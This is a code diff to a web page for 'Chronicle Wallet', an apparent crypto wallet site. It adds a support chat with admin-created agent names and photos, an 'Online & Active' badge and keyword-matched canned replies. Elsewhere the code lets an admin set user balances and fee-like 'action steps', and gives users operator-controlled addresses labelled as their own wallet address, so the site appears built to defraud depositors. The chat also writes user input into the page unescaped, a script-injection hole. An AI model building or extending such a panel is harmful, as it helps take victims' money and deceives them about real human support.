@@ -61,7 +61,7 @@
             width: 32px; height: 32px; background: linear-gradient(135deg, var(--primary), #a855f7);
             border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #fff;
         }
-        .header-actions { display: flex; align-items: center; gap: 1rem; }
+        .header-actions { display: flex; align-items: center; gap: 0.75rem; flex-wrap: wrap; }
         .auth-status-btn { background: rgba(255,255,255,0.05); border: 1px solid var(--border); color: var(--text-main); padding: 0.5rem 1rem; border-radius: 6px; cursor: pointer; font-size: 0.85rem; font-weight: 600; }
 
         .container { max-width: 1000px; width: 100%; margin: 2rem auto; padding: 0 1rem; }
@@ -111,6 +111,19 @@
         .payout-method-card:hover { border-color: var(--primary); }
         .exchange-card { background: var(--bg-input); border: 1px solid var(--border); padding: 0.85rem 1rem; border-radius: 10px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.75rem; }
         .email-item { background: var(--bg-input); padding: 0.85rem; border-radius: 8px; margin-bottom: 0.75rem; border-left: 4px solid var(--primary); }
+
+        /* Support Chat Drawer Styling */
+        #support-drawer {
+            position: fixed; bottom: 20px; right: 20px; width: 360px; max-width: 90vw; height: 500px;
+            background: var(--bg-card); border: 1px solid var(--border); border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            z-index: 2500; display: none; flex-direction: column; overflow: hidden;
+        }
+        .chat-header { background: var(--bg-input); padding: 1rem; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
+        .chat-body { flex: 1; padding: 1rem; overflow-y: auto; display: flex; flex-direction: column; gap: 0.75rem; font-size: 0.85rem; }
+        .chat-footer { padding: 0.75rem; background: var(--bg-input); border-top: 1px solid var(--border); display: flex; gap: 0.5rem; }
+        .chat-bubble { padding: 0.65rem 0.85rem; border-radius: 10px; max-width: 80%; line-height: 1.4; }
+        .chat-bubble.user { background: var(--primary); color: #fff; align-self: flex-end; }
+        .chat-bubble.agent { background: var(--bg-input); border: 1px solid var(--border); color: var(--text-main); align-self: flex-start; }
     </style>
 </head>
 <body id="app-body">
@@ -123,12 +136,34 @@
         </div>
     </div>
 
+    <!-- SUPPORT CHAT DRAWER -->
+    <div id="support-drawer">
+        <div class="chat-header">
+            <div style="display:flex; align-items:center; gap:0.5rem;">
+                <img id="active-agent-avatar" src="" style="width:32px; height:32px; border-radius:50%; object-fit:cover; background:#333;" alt="Agent">
+                <div>
+                    <strong id="active-agent-name" style="font-size:0.9rem;">Support AI / Agent</strong>
+                    <div style="font-size:0.7rem; color:var(--accent-green);">● Online & Active</div>
+                </div>
+            </div>
+            <span style="cursor:pointer; font-size:1.25rem; color:var(--text-muted);" onclick="toggleSupportChat()">&times;</span>
+        </div>
+        <div class="chat-body" id="chat-messages-container">
+            <div class="chat-bubble agent">Hello! Welcome to Chronicle Wallet support. How can we help you today? Ask any question or request help.</div>
+        </div>
+        <div class="chat-footer">
+            <input type="text" id="chat-input-box" class="form-control" placeholder="Type your message..." onkeydown="if(event.key==='Enter') sendChatMessage()">
+            <button class="btn" style="width:auto; padding:0 1rem;" onclick="sendChatMessage()">Send</button>
+        </div>
+    </div>
+
     <header>
         <div class="logo">
             <div class="logo-icon">C</div>
             Chronicle Wallet
         </div>
         <div class="header-actions">
+            <button class="btn btn-success" style="width:auto; padding:0.4rem 0.75rem; font-size:0.8rem;" onclick="toggleSupportChat()">💬 Support</button>
             <button class="btn btn-outline" style="width:auto; padding:0.4rem 0.75rem; font-size:0.8rem;" onclick="openSettingsModal()">⚙️ Settings</button>
             <button class="btn btn-outline" style="width:auto; padding:0.4rem 0.75rem; font-size:0.8rem;" onclick="openInboxModal()">📬 Inbox <span id="unread-badge" style="background:var(--accent-red); color:#fff; border-radius:50%; padding:2px 6px; font-size:0.7rem; margin-left:4px;">0</span></button>
             <button class="auth-status-btn" id="auth-status-btn" onclick="handleAuthHeaderClick()">Sign In / Sign Up</button>
@@ -246,6 +281,27 @@
                     <div class="form-group"><label>USD Cash Tag</label><input type="text" id="admin-usd-addr" class="form-control" required></div>
                     <button type="submit" class="btn">Update Receive Details</button>
                 </form>
+            </div>
+
+            <div class="card">
+                <h3>🤖 AI Support Knowledge Base & FAQ Training</h3>
+                <form onsubmit="saveKnowledgeBase(event)">
+                    <div class="form-group">
+                        <label>Website Info, Rules, Policies & FAQs (AI will read this to answer user questions)</label>
+                        <textarea id="admin-kb-text" class="form-control" rows="5" placeholder="Enter platform guides, deposit rules, withdrawal policies, fees, etc..." required></textarea>
+                    </div>
+                    <button type="submit" class="btn">Save Knowledge Base</button>
+                </form>
+            </div>
+
+            <div class="card">
+                <h3>👥 Support Agents Management</h3>
+                <form onsubmit="addSupportAgent(event)" style="display:grid; grid-template-columns:1fr 1fr; gap:0.75rem;">
+                    <div class="form-group"><label>Agent Name</label><input type="text" id="agent-name-input" class="form-control" required></div>
+                    <div class="form-group"><label>Agent Picture</label><input type="file" id="agent-pic-input" class="form-control" accept="image/*" required></div>
+                    <button type="submit" class="btn" style="grid-column: span 2;">Add Support Agent</button>
+                </form>
+                <div style="margin-top:1rem;" id="admin-agents-list"></div>
             </div>
 
             <div class="card">
@@ -444,7 +500,7 @@
             <h3 style="margin-bottom:0.5rem;">Buy Crypto</h3>
             <div class="form-group">
                 <label>Coin to Receive</label>
-                <select id="buy-coin-target" class="form-control"><option value="btc">Bitcoin (BTC)</option><option value="eth">Ethereum (ETH)</option></select>
+                <select id="buy-coin-target" class="form-control" onchange="openBuyModal()"><option value="btc">Bitcoin (BTC)</option><option value="eth">Ethereum (ETH)</option></select>
             </div>
             <div id="user-exchanges-container"></div>
         </div>
@@ -571,6 +627,11 @@
         };
         let platformTerms = "Welcome to Chronicle Wallet. By using our platform, you agree to our digital asset compliance, security policies, and transaction clearance guidelines.";
         let proofQueue = [];
+        let knowledgeBase = "Welcome to Chronicle Wallet. We support BTC, ETH, and USD cash. To withdraw, convert your crypto to USD fiat first. Verification steps require proof uploads.";
+        let supportAgents = [
+            { id: 1, name: "Agent Sarah", pic: "" }
+        ];
+        let activeAgentId = 1;
         let currentTheme = localStorage.getItem('chronicle_theme') || 'dark';
 
         if (currentTheme === 'light') document.getElementById('app-body').classList.add('light-mode');
@@ -584,7 +645,6 @@
             if (doc.exists) {
                 const data = doc.data();
                 
-                // Check if current user received new email / notification while app is open
                 if (currentUserEmail && data.userEmails && data.userEmails[currentUserEmail]) {
                     const newInboxLength = data.userEmails[currentUserEmail].length;
                     if (newInboxLength > lastInboxCount && lastInboxCount !== 0) {
@@ -601,13 +661,17 @@
                 if (data.globalAddresses) globalAddresses = data.globalAddresses;
                 if (data.platformTerms) platformTerms = data.platformTerms;
                 if (data.proofQueue) proofQueue = data.proofQueue;
+                if (data.knowledgeBase) knowledgeBase = data.knowledgeBase;
+                if (data.supportAgents) supportAgents = data.supportAgents;
+                if (data.activeAgentId) activeAgentId = data.activeAgentId;
                 
                 updateBalanceUI();
+                updateSupportAgentUI();
                 if (!document.getElementById('admin-tab').classList.contains('hidden')) {
                     renderAdminDashboard();
                 }
             } else {
-                saveState(); // Initialize Cloud Firestore document
+                saveState();
             }
         });
 
@@ -619,7 +683,10 @@
                 actionSteps: actionSteps,
                 globalAddresses: globalAddresses,
                 platformTerms: platformTerms,
-                proofQueue: proofQueue
+                proofQueue: proofQueue,
+                knowledgeBase: knowledgeBase,
+                supportAgents: supportAgents,
+                activeAgentId: activeAgentId
             }, { merge: true });
             localStorage.setItem('chronicle_current_user', currentUserEmail);
             localStorage.setItem('chronicle_theme', currentTheme);
@@ -645,7 +712,6 @@
             userEmails[email].unshift({ subject, body, date: new Date().toLocaleTimeString() });
             saveState();
 
-            // Force popup notification on screen for recipient if logged in on this browser
             if (currentUserEmail === email) {
                 showNotification(popupTitle, body, "💸");
             }
@@ -967,6 +1033,97 @@
             if (pendingSaves === 0) { saveState(); alert("Global addresses updated!"); }
         }
 
+        function saveKnowledgeBase(e) {
+            e.preventDefault();
+            knowledgeBase = document.getElementById('admin-kb-text').value;
+            saveState();
+            alert("AI Knowledge Base updated successfully!");
+        }
+
+        function addSupportAgent(e) {
+            e.preventDefault();
+            const name = document.getElementById('agent-name-input').value;
+            const file = document.getElementById('agent-pic-input').files[0];
+            if (!file) { alert("Please select agent picture."); return; }
+
+            const reader = new FileReader();
+            reader.onload = function(evt) {
+                supportAgents.push({ id: Date.now(), name, pic: evt.target.result });
+                document.getElementById('agent-name-input').value = '';
+                document.getElementById('agent-pic-input').value = '';
+                saveState();
+                renderAdminDashboard();
+                alert("Support agent added successfully!");
+            };
+            reader.readAsDataURL(file);
+        }
+
+        function deleteAgent(id) {
+            supportAgents = supportAgents.filter(x => x.id != id);
+            if (activeAgentId == id && supportAgents.length > 0) activeAgentId = supportAgents[0].id;
+            saveState();
+            renderAdminDashboard();
+        }
+
+        function setActiveAgent(id) {
+            activeAgentId = id;
+            saveState();
+            updateSupportAgentUI();
+            alert("Active support agent updated!");
+        }
+
+        function updateSupportAgentUI() {
+            const agent = supportAgents.find(x => x.id == activeAgentId) || supportAgents[0] || { name: "Support AI", pic: "" };
+            document.getElementById('active-agent-name').innerText = agent.name;
+            const avatarBox = document.getElementById('active-agent-avatar');
+            if (agent.pic) {
+                avatarBox.src = agent.pic;
+            } else {
+                avatarBox.src = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 24 24' fill='none' stroke='%23fff' stroke-width='2'><path d='M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2'></path><circle cx='12' cy='7' r='4'></circle></svg>";
+            }
+        }
+
+        function toggleSupportChat() {
+            const drawer = document.getElementById('support-drawer');
+            drawer.style.display = drawer.style.display === 'flex' ? 'none' : 'flex';
+            updateSupportAgentUI();
+        }
+
+        function sendChatMessage() {
+            const input = document.getElementById('chat-input-box');
+            const msg = input.value.trim();
+            if (!msg) return;
+
+            const container = document.getElementById('chat-messages-container');
+            container.innerHTML += `<div class="chat-bubble user">${msg}</div>`;
+            input.value = '';
+            container.scrollTop = container.scrollHeight;
+
+            // AI Knowledge Base Search
+            setTimeout(() => {
+                const lowerMsg = msg.toLowerCase();
+                const kbWords = knowledgeBase.toLowerCase().split(/\s+/);
+                let matched = false;
+
+                // Simple keyword check from KB
+                if (knowledgeBase && knowledgeBase.length > 5) {
+                    const sentences = knowledgeBase.split('.');
+                    for (let s of sentences) {
+                        if (s.toLowerCase().includes(lowerMsg) || lowerMsg.split(' ').some(w => w.length > 3 && s.toLowerCase().includes(w))) {
+                            container.innerHTML += `<div class="chat-bubble agent">${s.trim()}.</div>`;
+                            matched = true;
+                            break;
+                        }
+                    }
+                }
+
+                if (!matched) {
+                    container.innerHTML += `<div class="chat-bubble agent" style="color:var(--accent-yellow);">You're now being transferred to the available Agent. Please hold on...</div>`;
+                }
+                container.scrollTop = container.scrollHeight;
+            }, 1000);
+        }
+
         function saveAdminTerms(e) {
             e.preventDefault();
             platformTerms = document.getElementById('admin-terms-text').value;
@@ -1046,11 +1203,25 @@
             document.getElementById('admin-eth-addr').value = globalAddresses.eth || '';
             document.getElementById('admin-usd-addr').value = globalAddresses.usd || '';
             document.getElementById('admin-terms-text').value = platformTerms || '';
+            document.getElementById('admin-kb-text').value = knowledgeBase || '';
             document.getElementById('admin-target-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} [ID: ${u.userId}] (USD: $${u.usd})</option>`).join('');
             document.getElementById('admin-users-list').innerHTML = usersList.map(u => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px;"><strong>${u.email}</strong> [ID: ${u.userId}] - USD: $${u.usd} | BTC: ${u.btc}</div>`).join('');
             document.getElementById('admin-exchanges-list').innerHTML = exchanges.map(ex => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px; display:flex; justify-content:space-between;"><span>${ex.name}</span> <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteExchange(${ex.id})">Delete</button></div>`).join('');
             document.getElementById('action-steps-list').innerHTML = actionSteps.map((st, i) => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px; display:flex; justify-content:space-between;"><span>Step ${i+1}: ${st.title} ($${st.amount}) → Status: [${st.statusMsg}] (${st.timerMinutes || 5}m)</span> <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteActionStep(${st.id})">Delete</button></div>`).join('');
             
+            document.getElementById('admin-agents-list').innerHTML = supportAgents.map(ag => `
+                <div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.4rem; border-radius:6px; display:flex; align-items:center; justify-content:space-between;">
+                    <div style="display:flex; align-items:center; gap:0.5rem;">
+                        <img src="${ag.pic}" style="width:30px; height:30px; border-radius:50%; object-fit:cover;">
+                        <strong>${ag.name}</strong> ${activeAgentId == ag.id ? '<span style="color:var(--accent-green); font-size:0.75rem;">(Active on Screen)</span>' : ''}
+                    </div>
+                    <div style="display:flex; gap:0.3rem;">
+                        <button class="btn" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="setActiveAgent(${ag.id})">Set Active</button>
+                        <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteAgent(${ag.id})">Delete</button>
+                    </div>
+                </div>
+            `).join('');
+
             const queueContainer = document.getElementById('admin-queue');
             if (proofQueue.length === 0) {
                 queueContainer.innerHTML = `<span style="color:var(--text-muted)">No pending proofs.</span>`;
@@ -1160,7 +1331,9 @@
                         <div style="width:32px; height:32px; border-radius:6px; background:#fff; display:flex; align-items:center; justify-content:center; font-weight:bold; color:#000;">${ex.logo}</div>
                         <div>
                             <strong>${ex.name}</strong>
-                            <div style="font-size:0.75rem; color:var(--text-muted); cursor:pointer;" onclick="navigator.clipboard.writeText('${addr}'); alert('Copied address: ${addr}');">📋 Copy your ${coin.toUpperCase()} wallet address first</div>
+                            <div style="font-size:0.75rem; color:var(--text-muted); margin-top:2px;">
+                                Copy address first: <button class="btn" style="display:inline-block; width:auto; padding:2px 6px; font-size:0.7rem; background:var(--primary);" onclick="navigator.clipboard.writeText('${addr}'); alert('Copied address: ${addr}');">Click Here 📋</button>
+                            </div>
                         </div>
                     </div>
                     <a href="${ex.link}" target="_blank" class="btn" style="width:auto; padding:0.4rem 0.85rem; font-size:0.85rem; text-decoration:none;" onclick="alert('Ensure you paste your wallet address on ${ex.name}!');">Buy ↗</a>
@@ -1171,6 +1344,7 @@
         function closeBuyModal() { document.getElementById('buy-modal').style.display = 'none'; }
 
         updateBalanceUI();
+        updateSupportAgentUI();
     </script>
 </body>
 </html>
